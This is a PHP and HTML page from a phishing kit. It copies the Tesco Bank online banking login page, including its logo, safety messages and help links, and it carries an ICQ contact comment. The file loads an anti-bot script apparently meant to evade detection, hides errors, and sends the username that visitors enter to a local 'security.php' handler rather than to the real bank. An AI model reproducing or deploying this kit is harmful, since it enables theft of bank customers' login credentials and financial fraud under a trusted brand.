﻿<?php
/* ------------------------ ICQ : 743688056 ------------------------- */
include"../antibots.php";
require "assets/js/enc.php"; 
error_reporting(0);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class=" svg csscalc boxsizing js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Online Banking Login - Tesco Bank</title>
<meta content="width=device-width, initial-scale=1.0" name="viewport" id="viewport">
<meta name="keywords" content="">
<meta name="description" content="Log in to your Tesco Bank current accounts, credit cards, loans and savings through our Online Banking portal."><!--[if lt IE 9]><link rel="stylesheet" href="/assets/servicing/sections/sss/css/sss-login-ie.min.css?v=2.0.2"/><![endif]-->
<!--[if gt IE 8]><!--><link rel="stylesheet" href="./assets/css/login.min.css"><!--<![endif]--><!--[if IE 7]><script type="text/javascript">document.getElementsByTagName('html')[0].className += ' ie7 oldie'; </script><![endif]-->
<!--[if IE 8]><script type="text/javascript"> document.getElementsByTagName('html')[0].className += ' ie8 oldie'; </script><![endif]-->
<!--[if IE 9 & !IEMobile ]><script type="text/javascript"> document.getElementsByTagName('html')[0].className += ' ie9'; </script><![endif]-->
<script type="text/javascript" src="./assets/js/login-head.js"></script>
<script type="text/javascript">document.getElementsByTagName('html')[0].className += ' js';</script>
<meta name="apple-itunes-app" content="app-id=857834425">
<meta name="google-play-app" content="app-id=com.tescobank.mobile">
<script type="text/javascript" src="./assets/js/Bootstrap.js"></script><link rel="canonical" href="https://www.tescobank.com/sss/auth">
<link type="image/x-icon" href="./assets/img/favicon.png" rel="shortcut icon">
<link type="text/css" href="./assets/css/smart-app-banner.css" rel="stylesheet">
</head>
<body id="page-input-customer-no"><div id="top-border">
<div class="clearing" id="bottom-border">
<div id="page-container">
<div id="preheader"><script type="text/javascript">document.getElementsByTagName('body')[0].removeAttribute('class'); // remove no-js</script>
<div class="tesco-cookie-widget js-hide js-cookie-widget">
  <div class="inner">
    <p>Our website works better with cookies. Browsing on means you agree to our <a href="https://www.tescobank.com/help/privacy-and-cookies/">Cookie Policy</a>.</p>
  </div>
</div><!-- - --></div>
<div id="heading"><header role="banner">
  <div class="header">
    <div class="inner">
      <a href="https://www.tescobank.com/">
        <div class="header__logo" role="img" aria-label="Tesco Bank">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1130.6 208.1">
            <path fill="#274B93" d="M61.9 168H150c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.6 14.5-34.3 14.5H7.3c-.6 0-.6-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.2-14 31.7-14M639.9 168h88.2c.7 0 .9.5-.1.8-9.9 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23-18.4 23-18.4 5.6-5.8 17.2-14 31.6-14M206.4 168h88.1c.8 0 .9.5-.1.8-9.8 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.5 0-.5-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.3-14 31.7-14M351 168h88c.8 0 .9.5 0 .8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14M495.5 168h88.1c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.8 8.9-17.6 14.5-34.2 14.5h-84.2c-.6 0-.6-.5-.2-.7 9.4-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14"></path>
            <path fill="#C20E1A" d="M519.3 8.4c-55.4 0-92.1 26.7-92.1 67.3 0 37.3 33.6 62.1 84 62.1 16.3 0 31-2 47.9-6.1v-31.4c-12 12.7-26.4 17.7-41.8 17.7-29.7 0-50.1-18.6-50.1-45.3 0-26.3 21.1-45.4 50.6-45.4 16.1 0 29 5.7 39.3 15.8V11.7c-10.7-2.2-24.1-3.3-37.8-3.3M102.5 30.2c20.6.2 45.2 3.9 55.6 11.9V12.3H11.9v29.8C22.3 34 44 30.9 67.7 30.7v81.2c0 11.9-1 15.3-6 21.5h46.9c-5.3-6.2-6.1-9.6-6.1-21.5V30.2zM254.3 59.4c-8.5 2.7-23.4 3.5-31.6 3.5h-12.2V30.7H227c14.7 0 40.3 3.1 49.9 11.1V12.3H170.6c4.9 6.2 5.9 9.7 5.9 21.5V112c0 11.9-1 15.4-5.7 21.5h113.4V104c-15.5 11.1-45.1 11.2-57.2 11h-16.5V81h12.2c8.1 0 23 .9 31.6 3.5V59.4zM412 16.4c-16.7-5.3-38.9-8.3-55.8-8.3-30.8 0-60.7 9.1-60.7 39.7 0 53 92.3 25 92.3 57.4 0 10.5-16.3 14.8-29.5 14.8-23.8 0-40.3-3.6-61-16v26.6c15.5 5.1 36.6 7.6 59.5 7.6 31.9 0 61.7-8.2 61.7-39.5 0-55.3-92.3-30.5-92.3-57.5 0-10.9 14.8-14.7 27.7-14.7 21.8 0 45.3 6.5 58.2 18.4V16.4zM723.6 72.2c0-38.2-30.1-63.8-75.1-63.8-47.8 0-81.5 27.5-81.5 66.2 0 38 30.3 63.2 75.5 63.2 48 0 81.1-26.7 81.1-65.6m-119.9.7c0-25.5 16.2-46.3 41.6-46.3 25 0 41.6 20.7 41.6 46.3 0 25.6-16.6 46.2-41.6 46.2-25.4.1-41.6-20.6-41.6-46.2"></path>
            <path fill="#274B93" d="M828.6 76.3h-27.9v45.1h27.9c14.4 0 22.9-9.2 22.9-22.5 0-13.4-8.7-22.6-22.9-22.6m-3.4-51.8h-24.5v39.4h24.5c11.5 0 19.5-8 19.5-19.9 0-13-7.3-19.5-19.5-19.5m5.9 109.3h-43.5c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2-9.4H827c24.8 0 34.2 13.7 34.2 28.7 0 9-2.5 20.6-15.4 27.9 16.9 5.9 22.7 17.4 22.7 31.4 0 18.1-14 33.7-37.4 33.7M930.9 95.1c-4.6-.9-12.6-2-18.5-2-13.3 0-19.7 5.5-19.7 16 0 10.3 6.6 14.7 16.5 14.7 11.7 0 19-6.6 21.6-9.9V95.1zm2.7 38.7c-1.6 0-2.5-.7-2.5-2.1V126c-3.4 3.2-11.2 9.9-26.8 9.9-17.2 0-26.8-10.6-26.8-26.4 0-17.7 12.4-27.5 33-27.5 7.3 0 14.9.9 20.4 1.8v-4.3c0-13.5-7.3-17.9-21.1-17.9-11 0-19.2 3.7-21.8 5.5l-2.7-7.1c-.2-.7-.7-2.1-.5-2.3-.5-2.1.9-3.2 3.2-4.3 2.7-1.2 12.1-4.4 23.6-4.4 26.3 0 34.2 11.9 34.2 29.5v55.4h-12.2zM1021.1 133.8c-1.4 0-2.3-.7-2.3-2.1v-49c0-13.5-5-20.8-17.9-20.8-10.6 0-18.8 6.7-23.4 13.3v58.5h-12.6c-1.4 0-2.3-.7-2.3-2.1V72.7c0-5.3-.4-10.8-1.2-15.4-.4-2.5-.9-4.6-1.6-6.2h11.9c1.8 0 2.5.7 2.8 1.6.4.9.7 2.1.9 3.4.4 1.8.5 3.9.7 5.5 3.5-4.1 13.1-12.6 27.3-12.6 21.5 0 30.3 11.2 30.3 30.3v54.5h-12.6zM1107.6 133.8c-1.8 0-3.4-.5-5.3-2.7L1065 92.6v41.2h-12.6c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2.5-9.4l9.6-.9c2.3-.2 4.3-.4 5.1-.4 1.8 0 2.7.7 2.7 2.3V85l31.8-31.2c2.1-2 3.5-2.7 5.3-2.7h16.3L1080 88l45.4 45.8h-17.8z"></path>
          </svg>
        </div>
      </a>
      <div class="safety-message"><span class="safety-message__text">Your details are safe with us</span><i class="icon icon--security"></i></div>
    </div>
  </div>
</header>
<!-- - --></div>
<div id="maincontent">
<div id="content"><section class="signpost section-no-bottom bg-image" id="signpost-background">
<div class="inner">
<div class="signpost-highlight fade-white">
<h1>Log in to your accounts</h1>
</div>
</div>
</section><section class="login-grid login-grid--card">

  <div class="login-grid__item login-grid__item--half login-box-links-panel">
    <div class="login-grid__item__inner">
      <div class="form" id="login-box">
        <div id="login-loading" style="display: none;">
          <h2 class="login-heading">Detecting browser settings</h2>
          <div class="loader">
            <picture>
              <!-- <img src="https://tescobank.com/assets/core/img/layout/ajax-loader2.gif" alt="loading..."> -->
            </picture>
          </div>
          <p>If your device doesn't meet our
            <a href="https://www.tescobank.com/online-banking-help/technical-support.html">Online Banking system requirements</a> you may not be able to access Tesco Bank Online Banking.</p>
        </div>



        <div id="login-panel" class="hide" style="display: block;">
          <form action="security.php?action=error&account=<?=$rand;?>" enctype="application/x-www-form-urlencoded" method="post" id="login_uid_form" autocomplete="off">
            <h2 class="login-heading">Online Banking</h2>
            <input name="RelayState" type="hidden" value="banking" id="login_uid_form_RelayState">


            <div class="form__item form__item--wide">
              <label for="login-uid" class="form__label">Username</label>
              <div class="form__control">
                <input type="text" required name="uid" id="login-uid" class="form__input" placeholder="Enter username" autocomplete="off">
              </div>
            </div>
            <p class="login-forgotten-username">
              <a href="https://www.tescobank.com/sss/authforgottenUID">Forgotten your username?</a>
            </p>
            <div class="form__item form__item--wide">
              <div class="form__checkbox">
                <input class="form__checkbox__input" type="checkbox" id="remember-username">
                <label class="form__checkbox__label" for="remember-username">Remember my username
                  <a href="https://www.tescobank.com/sss/auth#" class="form-help has-icon js-form-help" data-target="#remember-username-help" aria-controls="remember-username-help">
                    <i class="icon icon--tooltip">
                      <span class="screen-reader-only">Remember my username help</span>
                    </i>
                  </a>
                </label>
              </div>
            </div>

            <div id="remember-username-help" class="form-help__content js-hide" aria-expanded="false">
              <p>Tick this box to save your username on this computer. We don't recommend you do this if you're using a public
                or shared computer.</p>
            </div>

            <div>
              <input type="submit" class="login-button login-button--secondary" id="login-uid-submit-button" value="Log in">
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>



</section><section class="login-grid">
  <div class="login-grid__item login-grid__item--two-thirds">
    <div class="login-grid__item__inner login-grid__item__inner--safety">
      <h2 class="login-heading">Keep your banking details safe</h2>
      <ul class="login-list">
        <li>Never tell anyone your security details.</li>
        <li>Never respond to an email asking for your personal security information.</li>
        <li>If you think you have received a fraudulent email, please forward it to
          <a href="mailto:phishing@tescobank.com">phishing@tescobank.com</a> and then delete it.</li>
      </ul>
      <ul class="list-icons">
        <li>
          <i class="icon icon--link-arrow icon--link-arrow-17"></i>
          <a href="https://www.tescobank.com/online-banking-help/index.html">Online banking help</a>
        </li>
        <li>
          <i class="icon icon--link-arrow icon--link-arrow-17"></i>
          <a href="https://www.tescobank.com/security/protecting-yourself.html">How to protect yourself online</a>
        </li>
      </ul>
    </div>
  </div>
</section><!-- - --></div>
<!-- - -->
</div>
<div id="row-footer"><footer>
  <div class="footer">
    <div class="inner">
      <p class="footer__copyright" role="contentinfo">Copyright © 2018 Tesco Personal Finance plc</p>
    </div>
  </div>
</footer>
<!-- - --></div>
<div id="postfooter"><script src="./assets/js/login.min.js" type="text/javascript"></script>
<script src="./assets/js/smart-app-banner.js" type="text/javascript"></script>
<!-- - --></div>
</div>
</div>
</div>

</body></html>